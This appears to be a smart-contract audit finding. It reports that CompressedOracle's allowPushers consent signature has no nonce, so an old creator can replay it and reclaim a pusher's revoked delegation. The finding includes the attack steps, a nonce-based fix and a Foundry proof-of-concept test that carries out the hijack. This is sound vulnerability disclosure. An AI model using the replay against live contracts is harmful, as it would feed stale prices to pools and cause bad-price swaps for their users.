### Title
`allowPushers` consent signature has no nonce, allowing replay within the deadline window to re-establish revoked delegation and redirect price pushes to a stale namespace - (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

### Summary
`allowPushers` in `CompressedOracle.sol` signs pusher consent over `(chainid, oracle, deadline, pusher, creator)` with no nonce. Within the deadline window the identical signature is accepted an unlimited number of times. A creator who previously held a pusher's delegation can replay the original consent bytes after the pusher has revoked and re-delegated to a different creator, silently overwriting `namespaceRemapping[pusher]` back to themselves. Every subsequent fallback push from that pusher then lands in the old creator's namespace instead of the new one, starving the new creator's feeds of updates and delivering stale prices to any pool that reads those feeds.

### Finding Description
`allowPushers` builds the signed digest as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no nonce, no used-signature bitmap, and no check on the current value of `namespaceRemapping[pusher]`. The only replay guard is the deadline, which the code's own comment acknowledges is there to prevent post-revocation re-establishment — but the deadline only blocks replay *after* it expires, not *within* the window:

> "the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it." [2](#0-1) 

`revokePusher` clears the mapping to `address(0)`:

```solidity
namespaceRemapping[msg.sender] = address(0);
``` [3](#0-2) 

But nothing prevents the old creator from immediately calling `allowPushers` again with the same bytes before the deadline, overwriting the cleared (or newly re-delegated) mapping.

The fallback push path resolves the namespace at call time:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [4](#0-3) 

So every push after the hijack writes into the old creator's namespace, not the new one.

### Impact Explanation
Attack sequence:

1. Pusher P signs consent for Creator A with `deadline = T+1 day`.
2. Creator A calls `allowPushers` → `namespaceRemapping[P] = A`.
3. P calls `revokePusher()` → `namespaceRemapping[P] = address(0)`.
4. P signs new consent for Creator B with `deadline = T+2 days`; Creator B calls `allowPushers` → `namespaceRemapping[P] = B`.
5. Creator A replays the original signature (still valid until `T+1 day`) → `namespaceRemapping[P] = A` again.
6. All subsequent fallback pushes from P land in Creator A's namespace; Creator B's feeds receive no further updates.
7. Any pool whose `PriceProvider` reads Creator B's `feedId` now reads a stale `timestampMs`. Depending on the pool's `maxTimeDelta`/`maxRefStaleness` configuration, swaps either revert (unusable swap flow) or execute against a stale bid/ask (bad-price execution).

The attacker is Creator A — a fully permissionless entity (feed creation requires no approval). The only precondition is possession of the original consent signature, which Creator A already holds from step 2.

### Likelihood Explanation
Any creator who has ever successfully called `allowPushers` retains the pusher's consent bytes. Re-calling `allowPushers` with those bytes costs one transaction and is executable at any time before the deadline. Deadlines are typically set days in the future (the test suite uses `block.timestamp + 1 days`), giving a wide attack window. No special privilege, no MEV, and no coordination is required. [5](#0-4) 

### Recommendation
Add a per-pusher-per-creator nonce to the signed digest and increment it on every successful `allowPushers` call. This makes each consent signature single-use:

```solidity
mapping(address pusher => mapping(address creator => uint256)) public delegationNonces;

function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
    _ensureDeadline(deadline);
    uint256 l = pushers.length;
    require(l == signatures.length);
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];
        if (pusher == msg.sender) revert NoSelfRemapping();

        uint256 nonce = delegationNonces[pusher][msg.sender]++;   // consume nonce
        bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, nonce))
        );
        require(pusher == ECDSA.recover(hash, signatures[i]));

        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

Alternatively, record a `usedSignatures` bitmap keyed on the digest and revert on reuse.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract AllowPushersReplayTest is Test {
    CompressedOracleV1 oracle;

    uint256 constant PUSHER_KEY  = 0xBEEF;
    uint256 constant CREATOR_A_KEY = 0xAAAA;
    uint256 constant CREATOR_B_KEY = 0xBBBB;

    address pusher;
    address creatorA;
    address creatorB;

    function setUp() public {
        oracle   = new CompressedOracleV1(address(this), 0);
        pusher   = vm.addr(PUSHER_KEY);
        creatorA = vm.addr(CREATOR_A_KEY);
        creatorB = vm.addr(CREATOR_B_KEY);
        vm.warp(1_700_000_000);
    }

    function _signConsent(uint256 key, uint256 deadline, address _pusher, address _creator)
        internal view returns (bytes memory)
    {
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, _pusher, _creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return abi.encodePacked(r, s, v);
    }

    function testReplayHijacksNamespaceFromNewCreator() public {
        uint256 deadlineA = block.timestamp + 1 days;
        bytes memory sigA = _signConsent(PUSHER_KEY, deadlineA, pusher, creatorA);

        // Step 1: Creator A establishes delegation
        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sigA;
        vm.prank(creatorA);
        oracle.allowPushers(deadlineA, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorA);

        // Step 2: Pusher revokes
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0));

        // Step 3: Pusher re-delegates to Creator B
        uint256 deadlineB = block.timestamp + 2 days;
        sigs[0] = _signConsent(PUSHER_KEY, deadlineB, pusher, creatorB);
        vm.prank(creatorB);
        oracle.allowPushers(deadlineB, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creatorB);

        // Step 4: Creator A replays the OLD signature — hijack succeeds
        sigs[0] = sigA;
        vm.prank(creatorA);
        oracle.allowPushers(deadlineA, pushers, sigs);

        // Pusher's namespace is now back under Creator A, not Creator B
        assertEq(oracle.namespaceRemapping(pusher), creatorA,
            "HIJACK: pusher namespace stolen from Creator B");

        // Step 5: Pusher's next fallback push lands in Creator A's namespace
        // Creator B's feeds receive no update → stale prices for any pool reading them
    }
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-209)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L241-242)
```text
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracle.t.sol (L339-342)
```text
    function testAllowPushersDelegatesNamespace() public {
        uint256 deadline = block.timestamp + 1 days;
        _allowPusher(deadline);
        assertEq(oracle.namespaceRemapping(pusher), creator, "pusher should map to creator");
```
